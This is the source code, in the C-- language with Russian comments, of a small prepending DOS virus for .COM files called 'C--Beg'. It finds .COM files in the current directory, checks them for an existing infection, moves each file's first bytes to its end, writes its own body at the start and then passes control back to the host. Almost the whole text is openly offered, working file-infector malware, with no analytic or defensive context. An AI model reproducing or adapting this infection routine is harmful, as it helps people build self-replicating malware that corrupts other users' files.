/* Простой .com вирус пишущийся в начало
Name:	C--Beg
Type:	Trivial.Com
Size:	241
*/

?alignword		0
?resize			0
?define	vlen	241

?include "DOS.H--"

byte	msk  = "*.com";
word	fpos = 0;		/* Инициализированная переменная */

main()
struct	filerec {		/* Локальные переменные. Иначе нельзя */
byte	stuff[21];		/* Какая-то фигня */
byte	fattr;			/* Аттрибуты файла */
word	ftime;			/* Время */
word	fdate;			/* Дата */
dword	fsize;			/* размер */
byte	fname[13];		/* Имя */
} dta;
byte	tst[vlen];
word	tmp;
{
 tmp = fpos;				/* Запомним смещение куска жертвы */
 setDTA(SS,#dta);			/* Установим DTA */
 if (@FINDFIRSTFILE(,,0,#msk) == 0)	/* Ищем первый файл */
  do
  {
   BX = FOPEN(2,,,#dta+0x1E);		/* пробуем открыть */
   if (BX != 0)
    {
     FREAD(,BX,vlen,#tst);		/* Прочитаем начало */
     SI = #tst; DI = 0x100; CX = 8;
     $rep				/* Обломно циклом делать */
     $cmpsb			/* Сравниваем себя с прочитанным кодом */
     if (CX != 0)			/* Совпали ? */
      {					/* Нет... */
	FSEEK(2,BX,0,0);		/* На конец файла */
	fpos = AX+0x100;		/* Сохраним смещение */
	FWRITE(,BX,vlen,#tst);		/* Пишим начало данного файла */
	FSEEK(0,BX,0,0);		/* На начало файла */
	FWRITE(,BX,vlen,0x100);		/* Пишим себя */
      }
     FCLOSE(,BX);  
    }
  } while (@FINDNEXTFILE() == 0);	/* Ищем следующий */
/* Увы,но немного ассемблера не помешает */
 $leave;				/* Иначе нельзя... */
 DI = 0x100-4; SI = tmp; CX = vlen;
 BX = DI;
 AX = 0xA4F3; $stosw;			/* Пишим код rep movsb */
 AX = 0x00EB; $stosw;			/* Пишим код очистки конвеера */
 $jmp BX
}